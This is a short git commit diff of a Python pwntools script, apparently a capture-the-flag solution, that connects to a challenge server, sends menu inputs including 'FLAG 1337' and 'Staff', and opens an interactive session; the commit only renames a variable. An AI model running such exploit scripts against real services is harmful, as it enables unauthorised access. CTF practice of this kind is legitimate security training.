c963bc62482d8af47f7b96b0bc7edad138345fe1
Navinduvin <71208443+navin-duvin@users.noreply.github.com>
2021-10-25 14:42:14 +0530

    Update staff.py

--- staff.py
+++ staff.py
@@ -1,10 +1,10 @@
 #!/usr/bin/python
 from pwn import *
 
-p = remote('pwn.chall.pwnoh.io', 13383)
+elf = remote('pwn.chall.pwnoh.io', 13383)
 
-p.sendlineafter('>', '1')
-p.sendlineafter('>', 'FLAG 1337')
-p.sendlineafter('>', '2')
-p.sendlineafter('>', 'Staff')
-p.interactive()
+elf.sendlineafter('>', '1')
+elf.sendlineafter('>', 'FLAG 1337')
+elf.sendlineafter('>', '2')
+elf.sendlineafter('>', 'Staff')
+elf.interactive()
